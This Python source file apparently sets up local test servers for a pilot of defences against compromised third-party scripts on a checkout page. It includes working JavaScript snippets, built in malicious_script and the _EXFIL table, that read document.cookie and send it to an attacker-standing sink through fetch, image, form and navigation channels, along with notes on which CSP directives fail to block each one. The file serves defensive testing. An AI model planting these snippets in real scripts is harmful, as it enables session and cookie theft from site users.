"""Three real local HTTP servers for the script-integrity pilot: the
operator's own "site" (127.0.0.1), which serves the page and sets its
CSP header; a third-party "vendor" (127.0.0.3), which serves the
embedded script; and a "sink" (127.0.0.2) standing in for an
attacker-controlled destination a compromised script could try to
reach. All are bound to loopback addresses under this machine's own
control -- nothing here contacts any real third party.

Distinct loopback addresses (all valid on Linux without extra
configuration) give the pilot genuinely different origins to register
and test against, without needing real DNS or real external domains.
"""
from __future__ import annotations

import http.server
import threading

GOOD_SCRIPT = b"""
document.addEventListener('DOMContentLoaded', function () {
  var b = document.getElementById('checkout-button');
  if (b) { b.disabled = false; }
});
"""

# A benign, reviewed vendor update: different bytes, same behavior. This
# models a legitimate script rotation an operator pre-registers the new
# hash for, not an incident.
BENIGN_UPDATE_SCRIPT = b"""
document.addEventListener('DOMContentLoaded', function () {
  var b = document.getElementById('checkout-button');
  if (b) { b.disabled = false; }
  // v2: cosmetic vendor comment, no behavior change
});
"""


EXFIL_CHANNELS = ("fetch", "image", "form", "navigation")

_EXFIL = {
    # A request through the Fetch API; governed by CSP connect-src.
    "fetch": "fetch(SINK + '/exfil-fetch?c=' + DATA, {mode: 'no-cors'}).catch(function(){});",
    # An image beacon; governed by CSP img-src, not connect-src.
    "image": "new Image().src = SINK + '/exfil-image?c=' + DATA;",
    # A form submission; governed by CSP form-action, which default-src
    # does not cover.
    "form": ("var f = document.createElement('form'); f.method = 'GET';"
             " f.action = SINK + '/exfil-form'; var i = document.createElement('input');"
             " i.name = 'c'; i.value = DATA; f.appendChild(i); document.body.appendChild(f); f.submit();"),
    # A top-level navigation; no CSP directive in current browsers
    # restricts where a page may navigate itself.
    "navigation": "window.location.href = SINK + '/exfil-nav?c=' + DATA;",
}


def malicious_script(sink_origin: str, channel: str = "fetch") -> bytes:
    """A compromised version of the vendor script: same visible behavior,
    plus a real request carrying page data to the attacker-controlled sink
    through one exfiltration channel, the way an actual supply-chain
    compromise sends data out through a request the static markup never
    declares."""
    if channel not in _EXFIL:
        raise ValueError(f"unknown channel {channel!r}")
    return (
        "document.addEventListener('DOMContentLoaded', function () {\n"
        "  var b = document.getElementById('checkout-button');\n"
        "  if (b) { b.disabled = false; }\n"
        "  var SINK = '" + sink_origin + "';\n"
        "  var DATA = encodeURIComponent(document.cookie || 'none');\n"
        "  " + _EXFIL[channel] + "\n"
        "});\n"
    ).encode("utf-8")


# 1x1 transparent GIF for the canary request.
_GIF = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00"
        b"\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")

PAGE_TEMPLATE = """<!doctype html>
<html><head><meta charset="utf-8"><title>Lab checkout page</title></head>
<body>
  <h1>Lab checkout page</h1>
  <button id="checkout-button" disabled>Checkout</button>
  <img src="/canary.gif" alt="" width="1" height="1">
  <script src="{script_url}"{script_attrs}></script>
  {extra_script_tag}
</body></html>
"""


class VendorState:
    """Mutable, thread-safe toggle for what the two servers currently
    serve, so the pilot can move through scenarios against one running
    pair of servers rather than restarting them. The operator's own
    site (`site_origin`) and the third-party vendor's script
    (`vendor_origin`) are deliberately served from two different
    loopback addresses, exactly as a real operator site and a real
    third-party CDN are two different origins -- serving them from the
    same origin would make a `script-src 'self'` CSP trivially cover
    the vendor script too, which is not how this containment action
    works for a genuine third party."""

    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.script_body = GOOD_SCRIPT
        self.csp_header: str | None = None
        self.extra_script_tag = ""
        # Extra attributes on the vendor <script> tag, e.g. an SRI pin:
        # ' integrity="sha384-..." crossorigin="anonymous"'.
        self.script_attrs = ""
        # Whether the vendor sends CORS headers. A browser refuses a
        # cross-origin SRI-pinned script without them.
        self.vendor_cors = True
        self.vendor_origin = ""   # set once the vendor server's real port is known
        self.site_origin = ""     # set once the site server's real port is known
        self.sink_origin = ""


def make_vendor_handler(state: VendorState):
    """Serves only the third-party script, from its own origin. The
    vendor does not control the operator's own CSP header; it serves
    whatever bytes `state.script_body` currently holds."""

    class VendorHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            with state.lock:
                body_bytes = state.script_body
                cors = state.vendor_cors
            if self.path == "/widget.js":
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(body_bytes)))
                if cors:
                    self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(body_bytes)
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, *args):
            pass

    return VendorHandler


def make_site_handler(state: VendorState):
    """Serves the operator's own page and sets the operator's own CSP
    header -- the header a real operator's server, not the vendor's,
    is responsible for."""

    class SiteHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            with state.lock:
                csp = state.csp_header
                script_url = state.vendor_origin + "/widget.js"
                extra = state.extra_script_tag
                attrs = state.script_attrs
            if self.path == "/canary.gif":
                # A page-owned, known-benign request, independent of the
                # vendor script: if the browser instrumentation does not
                # record this, it is not recording, and an empty capture
                # proves nothing.
                self.send_response(200)
                self.send_header("Content-Type", "image/gif")
                self.send_header("Content-Length", str(len(_GIF)))
                self.end_headers()
                self.wfile.write(_GIF)
                return
            if self.path == "/page.html":
                payload = PAGE_TEMPLATE.format(script_url=script_url, script_attrs=attrs, extra_script_tag=extra).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(payload)))
                if csp:
                    self.send_header("Content-Security-Policy", csp)
                self.end_headers()
                self.wfile.write(payload)
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, *args):
            pass

    return SiteHandler


class SinkState:
    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.hits: list[str] = []


def make_sink_handler(state: SinkState):
    class SinkHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            with state.lock:
                state.hits.append(self.path)
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

        def log_message(self, *args):
            pass

    return SinkHandler


def start_server(host: str, handler_cls) -> http.server.HTTPServer:
    server = http.server.ThreadingHTTPServer((host, 0), handler_cls)
    server.daemon_threads = True
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server
